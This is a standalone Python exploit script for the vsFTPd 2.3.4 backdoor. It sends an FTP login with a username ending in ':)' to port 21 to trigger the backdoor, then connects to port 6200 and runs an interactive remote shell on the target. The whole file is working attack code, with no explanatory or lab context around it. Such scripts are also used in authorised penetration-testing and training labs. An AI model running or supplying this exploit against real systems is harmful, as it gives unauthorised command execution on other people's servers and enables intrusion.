#!/usr/bin/python3

import socket
import argparse
from signal import signal, SIGINT
from sys import exit
import time

def handler(signal_received, frame):
    # Handle any cleanup here
    print('\n[+] Exiting...')
    exit(0)

signal(SIGINT, handler)

def create_socket_connection(host, port, timeout=5):
    """Create a socket connection with timeout handling"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        return sock
    except Exception as e:
        print(f"[-] Connection to {host}:{port} failed: {str(e)}")
        return None

def ftp_interaction(host, port, commands):
    """Handle FTP interaction"""
    try:
        sock = create_socket_connection(host, port)
        if not sock:
            return False
            
        banner = sock.recv(1024)
        print(f"[*] FTP Banner: {banner.decode().strip()}")
        
        for cmd in commands:
            sock.send(cmd.encode('ascii') + b"\r\n")
            response = sock.recv(1024)
            print(f"[>] Sent: {cmd.strip()}")
            print(f"[<] Received: {response.decode().strip()}")
            time.sleep(0.5)
            
        sock.close()
        return True
        
    except Exception as e:
        print(f"[-] FTP interaction error: {str(e)}")
        return False

def exploit(host):
    """Main exploit function"""
    port_ftp = 21
    port_backdoor = 6200
    
    # FTP commands to trigger the backdoor
    commands = [
        "USER nergal:)",
        "PASS pass"
    ]
    
    print(f"[*] Attempting to trigger vsFTPd 2.3.4 backdoor on {host}")
    
    # Trigger the backdoor
    if not ftp_interaction(host, port_ftp, commands):
        print("[-] Failed to trigger the backdoor")
        return
        
    print("[*] Attempting to connect to backdoor on port 6200")
    
    # Try to connect to the backdoor
    try:
        backdoor_sock = create_socket_connection(host, port_backdoor, timeout=10)
        if backdoor_sock:
            print("[+] Success! Backdoor connection established")
            print("[*] Type 'exit' to quit the shell\n")
            
            # Simple interactive shell
            while True:
                try:
                    cmd = input("shell> ")
                    if cmd.lower() == 'exit':
                        break
                    backdoor_sock.send(cmd.encode() + b"\n")
                    response = backdoor_sock.recv(4096)
                    print(response.decode())
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"[-] Error during shell interaction: {str(e)}")
                    break
                    
            backdoor_sock.close()
        else:
            print("[-] Failed to connect to backdoor. Target may not be vulnerable or port is blocked")
    except Exception as e:
        print(f"[-] Backdoor connection error: {str(e)}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='vsFTPd 2.3.4 Backdoor Exploit')
    parser.add_argument("host", help="Target IP address", type=str)
    args = parser.parse_args()
    
    exploit(args.host)
